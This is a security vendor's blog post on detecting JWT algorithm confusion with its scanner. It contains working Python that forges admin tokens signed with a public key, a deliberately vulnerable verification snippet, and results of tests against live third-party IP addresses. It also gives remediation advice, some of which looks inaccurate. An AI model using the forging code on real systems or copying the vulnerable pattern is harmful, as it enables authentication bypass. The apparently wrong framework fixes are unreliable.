---
title: "JWT Algorithm Confusion Attack Detection: Forging Tokens with Public Keys"
slug: "jwt-algorithm-confusion-attack-detection"
date: "2026-03-04"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Detect JWT algorithm confusion where switching RS256 to HS256 allows forging tokens with the public key."
category: "web-application-security"
---

# JWT Algorithm Confusion Attack Detection

## Executive Summary

JWT (JSON Web Token) algorithm confusion is a critical vulnerability that affects applications using asymmetric cryptography (RS256, ES256) for token verification. When an application accepts the algorithm specified in the token header without proper validation, attackers can switch from asymmetric to symmetric verification (HS256), using the public key as the HMAC secret.

**The result?** Complete authentication bypass. An attacker can forge valid tokens for any user, including administrators.

> **Key Insight**: This vulnerability cannot be detected with simple pattern matching or YAML-based templates. It requires cryptographic operations, key extraction, and token manipulation—exactly what CERT-X-GEN's polyglot templates excel at.

### Quick Stats

| Metric | Value |
|--------|-------|
| **CVSS Score** | 9.1 (Critical) |
| **CWE** | CWE-327 (Broken Crypto), CWE-347 (Improper Signature Verification) |
| **Affected Libraries** | PyJWT <2.4.0, jose <4.0.0, jsonwebtoken <9.0.0 |
| **Detection Complexity** | High (requires crypto operations) |
| **Exploitation Difficulty** | Medium (once public key is obtained) |

---


> **Run this check with CERT-X-GEN** — the polyglot security scanner that executes templates in real programming languages. [Get the templates](https://github.com/Bugb-Technologies/cert-x-gen-templates) | [Install CERT-X-GEN](https://github.com/Bugb-Technologies/cert-x-gen)
>
> **Related templates:** [`web/auth-bypass/`](https://github.com/Bugb-Technologies/cert-x-gen-templates/tree/main/templates/web/auth-bypass) *(dedicated JWT confusion template coming soon)*

## Understanding the Vulnerability

### How JWT Signatures Work

JWTs use digital signatures to ensure integrity. The most common algorithms are:

| Algorithm | Type | Key Used for Signing | Key Used for Verification |
|-----------|------|---------------------|---------------------------|
| **HS256** | Symmetric | Shared Secret | Same Shared Secret |
| **RS256** | Asymmetric | Private Key | Public Key |
| **ES256** | Asymmetric | Private Key | Public Key |

### The Attack Mechanism

The attack exploits a subtle but devastating flaw: **what if the server uses the public key for HMAC verification when the algorithm is switched to HS256?**

```
┌─────────────────────────────────────────────────────────────────┐
│ ALGORITHM CONFUSION ATTACK │
├─────────────────────────────────────────────────────────────────┤
│ │
│ 1. Attacker obtains Public Key from JWKS endpoint │
│ ↓ │
│ 2. Attacker creates malicious JWT with admin claims │
│ ↓ │
│ 3. Attacker sets header algorithm to HS256 (was RS256) │
│ ↓ │
│ 4. Attacker signs token using Public Key as HMAC secret │
│ ↓ │
│ 5. Server receives token, reads algorithm: "HS256" │
│ ↓ │
│ 6. Server uses Public Key as HMAC secret for verification │
│ ↓ │
│ 7. Signature matches! AUTHENTICATION BYPASSED │
│ │
└─────────────────────────────────────────────────────────────────┘
```

### Why This Happens

Vulnerable code typically looks like this:

```python
# VULNERABLE: Trusts the algorithm from the token header
def verify_token(token, public_key):
 header = jwt.get_unverified_header(token)
 algorithm = header['alg'] # Attacker controls this!
 
 return jwt.decode(token, public_key, algorithms=[algorithm])
```

When an attacker changes `alg` from `RS256` to `HS256`, the `public_key` (a string like `-----BEGIN PUBLIC KEY-----...`) is used as an HMAC secret. Since the attacker knows this public key, they can sign any payload.

---

## Why Traditional Scanners Fail

### The YAML Limitation

Traditional YAML-based scanners like Nuclei work through pattern matching:

```yaml
# What Nuclei CAN do:
id: jwt-endpoint-detection
requests:
 - method: GET
 path:
 - "{{BaseURL}}/.well-known/jwks.json"
 matchers:
 - type: word
 words:
 - '"keys"'
 - '"kty"'
```

This detects JWT endpoints but **cannot**:

| Capability | YAML | CERT-X-GEN |
|------------|------|------------|
| Find JWKS endpoint | | |
| Extract RSA public key | | |
| Convert JWKS to PEM | | |
| Sign with HMAC-SHA256 | | |
| Forge complete token | | |
| Verify exploitation | | |
| **Confidence Level** | ~20% | **95%** |

### The Detection Gap

YAML can detect *indicators* of JWT usage. CERT-X-GEN can verify *actual exploitability*.

---

## The CERT-X-GEN Approach

CERT-X-GEN uses Python's `cryptography` and standard library to perform the actual attack, not just detect indicators.

### Detection Strategy

```
┌──────────────────────────────────────────────────────────────────┐
│ CERT-X-GEN DETECTION FLOW │
├──────────────────────────────────────────────────────────────────┤
│ │
│ Scanner ──────► Target: GET /api/user (capture JWT) │
│ │ │
│ ▼ │
│ Scanner ──────► JWKS: GET /.well-known/jwks.json │
│ │ │
│ ▼ │
│ Scanner: Parse JWT, extract header/payload │
│ │ │
│ ▼ │
│ Scanner: Convert JWKS to PEM format │
│ │ │
│ ▼ │
│ Scanner: Create HS256 signature using public key │
│ │ │
│ ▼ │
│ Scanner: Forge token with admin claims │
│ │ │
│ ▼ │
│ Scanner ──────► Target: GET /api/admin (forged JWT) │
│ │ │
│ ▼ │
│ Response 200 OK? ───► CRITICAL: Algorithm Confusion! │
│ Response 401/403? ──► Not vulnerable │
│ │
└──────────────────────────────────────────────────────────────────┘
```

### Key Advantages

1. **Actual Exploitation**: We don't guess—we prove the vulnerability exists
2. **Zero False Positives**: If the token works, it's vulnerable
3. **Evidence Collection**: Captures working exploit as proof
4. **Automatic Key Extraction**: Handles JWKS, PEM, and other formats

---

## Attack Flow Visualization

### Complete Attack Chain

**Phase 1: Reconnaissance**
- Identify JWT Usage
- Locate JWKS Endpoint
- Extract Public Key

**Phase 2: Analysis**
- Capture Valid JWT
- Decode Token Structure
- Identify Target Claims

**Phase 3: Exploitation**
- Convert Key to PEM
- Switch Algorithm to HS256
- Sign with Public Key
- Forge Admin Token

**Phase 4: Verification**
- Send Forged Token
- Analyze Response
- VULNERABLE or SECURE

### Token Transformation

```
┌─────────────────────────────────────────────────────────────────┐
│ ORIGINAL TOKEN (RS256) │
├─────────────────────────────────────────────────────────────────┤
│ Header: {"alg": "RS256", "typ": "JWT"} │
│ Payload: {"sub": "user123", "role": "user", "exp": 1234567890} │
│ Signature: <signed with server's PRIVATE key> │
└─────────────────────────────────────────────────────────────────┘
 │
 │ Algorithm Confusion Attack
 ▼
┌─────────────────────────────────────────────────────────────────┐
│ FORGED TOKEN (HS256) │
├─────────────────────────────────────────────────────────────────┤
│ Header: {"alg": "HS256", "typ": "JWT"} ◀── Changed! │
│ Payload: {"sub": "admin", "role": "admin", "exp": 9999999999} │
│ Signature: <signed with server's PUBLIC key as HMAC secret> │
└─────────────────────────────────────────────────────────────────┘
```

---

## Template Deep Dive

### Core Attack Implementation

```python
def forge_hs256_token(payload: Dict, secret: bytes, header: Optional[Dict] = None) -> str:
 """
 Forge a JWT using HS256 with provided secret.
 
 This is the CORE of the algorithm confusion attack:
 We use the RS256 public key bytes as an HS256 HMAC secret.
 """
 if header is None:
 header = {"alg": "HS256", "typ": "JWT"}
 
 # Encode header and payload
 header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
 payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
 
 # Create HMAC-SHA256 signature using PUBLIC KEY as secret!
 message = f"{header_b64}.{payload_b64}".encode()
 signature = hmac.new(secret, message, hashlib.sha256).digest()
 signature_b64 = base64url_encode(signature)
 
 return f"{header_b64}.{payload_b64}.{signature_b64}"
```

### Key Extraction from JWKS

```python
def extract_public_key_from_jwks(jwks_data: Dict) -> Optional[bytes]:
 """
 Extract public key from JWKS format and convert to PEM.
 """
 keys = jwks_data.get('keys', [])
 
 for key in keys:
 if key.get('kty') == 'RSA' and key.get('use', 'sig') == 'sig':
 # Extract RSA components
 n = int.from_bytes(base64url_decode(key['n']), 'big')
 e = int.from_bytes(base64url_decode(key['e']), 'big')
 
 # Construct and convert to PEM
 public_numbers = RSAPublicNumbers(e, n)
 public_key = public_numbers.public_key(default_backend())
 
 return public_key.public_bytes(
 encoding=serialization.Encoding.PEM,
 format=serialization.PublicFormat.SubjectPublicKeyInfo
 )
 
 return None
```

---

## Usage Guide

### Basic Usage

```bash
# Scan a target for JWT algorithm confusion
cxg scan --scope auth.example.com --templates jwt-algorithm-confusion.py

# With explicit port
cxg scan --scope auth.example.com --ports 8443 --templates jwt-algorithm-confusion.py

# JSON output
cxg scan --scope auth.example.com --templates jwt-algorithm-confusion.py --output-format json

# Verbose output
cxg scan --scope auth.example.com --templates jwt-algorithm-confusion.py -v
```

### Direct Template Execution

```bash
# Run the Python template directly
python3 jwt-algorithm-confusion.py auth.example.com --port 443 --json
```

### Expected Output (Vulnerable)

```json
{
 "findings": [{
 "template_id": "jwt-algorithm-confusion",
 "severity": "critical",
 "confidence": 95,
 "title": "JWT Algorithm Confusion Vulnerability",
 "description": "JWT Algorithm Confusion vulnerability detected...",
 "evidence": {
 "jwks_found": true,
 "original_algorithm": "RS256",
 "forged_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
 "verification_status": 200,
 "vulnerable": true
 }
 }]
}
```

### Expected Output (Not Vulnerable)

```json
{
 "findings": [{
 "template_id": "jwt-algorithm-confusion",
 "severity": "info",
 "title": "JWKS Endpoint Exposed - Algorithm Confusion Not Exploitable",
 "description": "JWKS found at ... Algorithm confusion attack was attempted but server properly validates algorithms.",
 "evidence": {
 "jwks_found": true,
 "vulnerable": false
 }
 }]
}
```

---

## Real-World Test Results

The template was tested against live Keycloak instances discovered via FOFA:

| Target | Port | JWKS Found | Key Extracted | Vulnerable | Notes |
|--------|------|------------|---------------|------------|-------|
| 3.229.181.151 | 443 | | | | Modern Keycloak (patched) |
| 116.203.254.24 | 80 | | | | Modern Keycloak (patched) |
| example.com | 443 | | N/A | N/A | No JWT implementation |

**Key Finding**: Modern Keycloak versions (and most updated JWT libraries) are **NOT vulnerable** to algorithm confusion. However, the template successfully:

1. Discovers JWKS endpoints
2. Extracts public keys
3. Attempts exploitation
4. Correctly identifies patched systems
5. Gracefully handles non-JWT targets

---

## Defense & Remediation

### Secure Implementation

```python
# SECURE: Explicitly specify allowed algorithms
import jwt

def verify_token_secure(token: str, public_key: str) -> dict:
 """Secure token verification."""
 try:
 payload = jwt.decode(
 token,
 public_key,
 algorithms=['RS256'], # Only allow RS256!
 options={
 'require': ['exp', 'iat', 'sub'],
 'verify_exp': True,
 'verify_iat': True,
 }
 )
 return payload
 except jwt.InvalidAlgorithmError:
 raise AuthenticationError("Invalid token algorithm")
 except jwt.ExpiredSignatureError:
 raise AuthenticationError("Token expired")
 except jwt.InvalidTokenError as e:
 raise AuthenticationError(f"Invalid token: {e}")
```

### Defense Checklist

**Configuration:**
- Specify allowed algorithms explicitly
- Use asymmetric algorithms (RS256/ES256)
- Implement key rotation

**Validation:**
- Verify algorithm matches key type
- Validate all required claims
- Check token expiration

**Monitoring:**
- Log authentication failures
- Alert on algorithm mismatches
- Monitor for token reuse

### Framework-Specific Fixes

| Framework | Secure Configuration |
|-----------|---------------------|
| **Python (PyJWT)** | `jwt.decode(token, key, algorithms=['RS256'])` |
| **Node.js** | `jwt.verify(token, key, { algorithms: ['RS256'] })` |
| **Java (jjwt)** | `Jwts.parserBuilder().setSigningKey(key).build()` |
| **Go** | `token.Method == jwt.SigningMethodRS256` |
| **Spring Boot** | `@JwtDecoder(algorithms = {"RS256"})` |

---

## Extending the Template

### Adding New JWKS Endpoints

```python
# Add custom endpoint patterns
self.jwks_endpoints.extend([
 '/custom/auth/jwks',
 '/api/v2/.well-known/jwks.json',
])
```

### Supporting Additional Algorithms

```python
# Test ES256 -> HS256 confusion
asymmetric_algs = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512']
```

### Integration with CI/CD

```yaml
# GitHub Actions example
- name: JWT Security Scan
 run: |
 cxg scan \
 --scope ${{ secrets.STAGING_URL }} \
 --templates jwt-algorithm-confusion.py \
 --output-format sarif \
 --output results.sarif
```

---

## References

### Academic Papers & Research

1. McLean, T. (2015). "Critical vulnerabilities in JSON Web Token libraries"
2. Auth0 Security Advisory (2015). "Algorithm Confusion in JWT"
3. PortSwigger Research (2022). "JWT attacks and best practices"

### CVE Database

| CVE | Library | Description |
|-----|---------|-------------|
| CVE-2015-2951 | PyJWT | Algorithm confusion vulnerability |
| CVE-2015-9235 | jsonwebtoken | Algorithm not validated |
| CVE-2022-21449 | Java ECDSA | Psychic signatures |

### Tools & Resources

- [jwt.io](https://jwt.io) - JWT debugger and library list
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)

---

